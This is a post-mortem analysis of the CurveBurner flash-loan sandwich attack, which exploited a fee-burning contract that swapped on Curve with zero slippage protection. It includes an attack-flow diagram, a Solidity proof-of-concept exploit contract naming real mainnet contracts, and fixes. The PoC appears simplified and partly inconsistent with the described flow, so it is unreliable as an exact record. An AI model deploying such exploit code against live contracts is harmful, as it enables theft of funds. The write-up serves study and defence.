# CurveBurner Sandwich Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | CurveBurner |
| Date | 2023-08-22 |
| Chain | Ethereum Mainnet |
| Loss | ~$36,000 USD |
| Attack Type | Flash Loan + Sandwich Attack |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0xccc526e2433db1eebb9cbf6acd7f03a19408278c` |
| Attack Contract | `0x915dff6707bea63daea1b41aa5d37353229066ba` |
| Vulnerable Contract | `0x786b374b5eef874279f4b7b4de16940e57301a58` (CurveBurner) |
| Fork Block | 17,823,542 |

## 2. Vulnerability Code Analysis

`CurveBurner` was a contract designed to burn accumulated fees via Curve pools. When `execute()` was called, it performed large Curve swaps with no slippage protection. The attacker obtained substantial liquidity via a flash loan, manipulated the Curve pool state through Aave/Compound positions, then sandwiched the CurveBurner's `execute()` transaction.

```solidity
// Vulnerable pattern: Curve burn execution with no slippage protection
contract CurveBurner {
    ICurve public curve3Pool;
    ICurve public curveWstEthPool;

    // Vulnerable: min_dy = 0, no slippage protection
    function execute() external {
        uint256 usdtBalance = USDT.balanceOf(address(this));
        if (usdtBalance > 0) {
            USDT.approve(address(curve3Pool), usdtBalance);
            // Vulnerable: minimum received amount (min_dy) = 0
            curve3Pool.exchange(2, 1, usdtBalance, 0);
        }

        uint256 usdcBalance = USDC.balanceOf(address(this));
        if (usdcBalance > 0) {
            USDC.approve(address(curve3Pool), usdcBalance);
            // Vulnerable: unlimited slippage allowed
            curve3Pool.exchange(1, 0, usdcBalance, 0);
        }
    }
}
```

**Vulnerability**: `CurveBurner.execute()` executed Curve swaps with `min_dy = 0`, providing zero slippage protection. The attacker built large positions through Aave V2/V3 and Compound (cETH, cUSDT), manipulated Curve 3Pool liquidity, and executed a sandwich attack around the `execute()` call.

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Sandwich Attack
// Unverified source code — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0xccc526e2433db1eebb9cbf6acd7f03a19408278c]
  │
  ├─1─▶ Balancer.flashLoan()
  │      [Balancer Vault: 0xBA12222222228d8Ba445958a75a0704d566BF2C8]
  │      Borrow large amounts of wstETH + WETH
  │
  ├─2─▶ Aave V3 Manipulation
  │      aaveV3.supply(wstETH)
  │      aaveV3.borrow(WETH)
  │      Manipulate Curve wstETH pool ratio
  │
  ├─3─▶ Aave V2 Manipulation
  │      aaveV2.deposit(WETH)
  │      aaveV2.borrow(USDT/USDC)
  │
  ├─4─▶ Compound Manipulation
  │      Cointroller.enterMarkets()
  │      cETH.mint() - provide collateral
  │      cUSDT.borrow() - borrow USDT
  │      Manipulate Curve 3Pool ratio
  │
  ├─5─▶ Curve 3Pool Sandwich
  │      Curve3POOL.add_liquidity() - manipulate liquidity
  │      CurveBurner.execute() triggered
  │      → Burn executed at unfavorable price with min_dy=0
  │      Curve3POOL.remove_liquidity_one_coin() - realize profit
  │      Curve3POOL.remove_liquidity_imbalance() - additional cleanup
  │
  ├─6─▶ Unwind all Aave/Compound positions
  │      aaveV3.repay(), aaveV3.withdraw()
  │      aaveV2.repay(), aaveV2.withdraw()
  │      cETH.redeemUnderlying(), cUSDT.repayBorrow()
  │
  └─7─▶ Repay Balancer flash loan + ~$36,000 profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface ICurveBurner {
    function execute() external;
}

interface ICurve {
    function add_liquidity(uint256[3] calldata amounts, uint256 min_mint_amount) external returns (uint256);
    function remove_liquidity_one_coin(uint256 token_amount, int128 i, uint256 min_amount) external returns (uint256);
    function remove_liquidity_imbalance(uint256[3] calldata amounts, uint256 max_burn_amount) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
}

contract CurveBurnerExploit {
    ICurveBurner burner = ICurveBurner(0x786b374b5eef874279f4b7b4de16940e57301a58);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ICurve curve3Pool = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    IAaveV3 aaveV3 = IAaveV3(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IAaveV2 aaveV2 = IAaveV2(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    ICointroller compound = ICointroller(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    crETH cETH = crETH(0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5);
    ICErc20Delegate cUSDT = ICErc20Delegate(0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9);

    function testExploit() external {
        address[] memory tokens = new address[](2);
        tokens[0] = address(wstETH);
        tokens[1] = address(WETH);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1000 ether;
        amounts[1] = 5000 ether;

        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        // Manipulate Curve wstETH pool via Aave V3
        wstETH.approve(address(aaveV3), amounts[0]);
        aaveV3.supply(address(wstETH), amounts[0], address(this), 0);
        aaveV3.borrow(address(WETH), amounts[0] * 8 / 10, 2, 0, address(this));

        // Manipulate Curve 3Pool via Compound
        address[] memory markets = new address[](1);
        markets[0] = address(cETH);
        compound.enterMarkets(markets);
        cETH.mint{value: address(this).balance}();
        cUSDT.borrow(500_000e6);

        // Curve 3Pool sandwich
        USDT.approve(address(curve3Pool), type(uint256).max);
        uint256[3] memory addAmounts = [uint256(0), uint256(0), USDT.balanceOf(address(this))];
        curve3Pool.add_liquidity(addAmounts, 0);

        // Call CurveBurner.execute() — runs with no slippage protection
        burner.execute();

        // Remove liquidity in manipulated state to realize profit
        uint256 lpBalance = IERC20(address(curve3Pool)).balanceOf(address(this));
        curve3Pool.remove_liquidity_imbalance([uint256(0), uint256(0), lpBalance * 90 / 100], lpBalance);

        // Unwind Compound positions
        cUSDT.repayBorrow(type(uint256).max);
        cETH.redeemUnderlying(address(this).balance);

        // Unwind Aave V3 positions
        WETH.approve(address(aaveV3), type(uint256).max);
        aaveV3.repay(address(WETH), type(uint256).max, 2, address(this));
        aaveV3.withdraw(address(wstETH), type(uint256).max, address(this));

        // Repay flash loan
        wstETH.transfer(address(balancer), amounts[0] + feeAmounts[0]);
        WETH.transfer(address(balancer), amounts[1] + feeAmounts[1]);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Swap with no slippage protection, sandwich attack |
| Impact Scope | CurveBurner fee-burning contract |
| Explorer | [Etherscan](https://etherscan.io/address/0x786b374b5eef874279f4b7b4de16940e57301a58) |

## 6. Security Recommendations

```solidity
// Fix 1: Add slippage protection
contract CurveBurner {
    uint256 public constant MAX_SLIPPAGE = 50; // 0.5%

    function execute() external {
        uint256 usdtBalance = USDT.balanceOf(address(this));
        if (usdtBalance > 0) {
            USDT.approve(address(curve3Pool), usdtBalance);
            // Calculate expected output
            uint256 expectedOut = curve3Pool.get_dy(2, 1, usdtBalance);
            uint256 minOut = expectedOut * (10000 - MAX_SLIPPAGE) / 10000;
            // Apply slippage protection
            curve3Pool.exchange(2, 1, usdtBalance, minOut);
        }
    }
}

// Fix 2: Add access control to execute()
function execute() external {
    require(msg.sender == keeper || msg.sender == owner, "Not authorized");
    // ...
}

// Fix 3: Detect price manipulation
function execute() external {
    // Reject execution if Curve pool price deviates significantly from Chainlink
    uint256 curvePrice = curve3Pool.get_virtual_price();
    uint256 chainlinkPrice = getChainlinkUSDPrice();
    require(
        abs(curvePrice - chainlinkPrice) <= chainlinkPrice * 100 / 10000,
        "Price deviation detected"
    );
    // ...
}
```

## 7. Lessons Learned

1. **Slippage Protection is Mandatory**: Every function that executes a DEX swap must set `min_dy > 0` for slippage protection. Setting `min_dy = 0` is equivalent to allowing an unrestricted sandwich attack.
2. **Burn/Fee Contract Security**: Contracts that automatically swap or burn tokens are prime targets for MEV bots. Access control and slippage protection are both essential.
3. **Multi-Protocol Combination Attacks**: Complex attacks that simultaneously leverage Balancer, Aave V2/V3, and Compound to manipulate Curve pool state cannot be defended against by protecting any single protocol in isolation.
4. **Curve Pool Price Stability**: Curve pools can also experience temporary price distortion from large liquidity injections or removals. Critical burn/execution functions require price anomaly detection logic.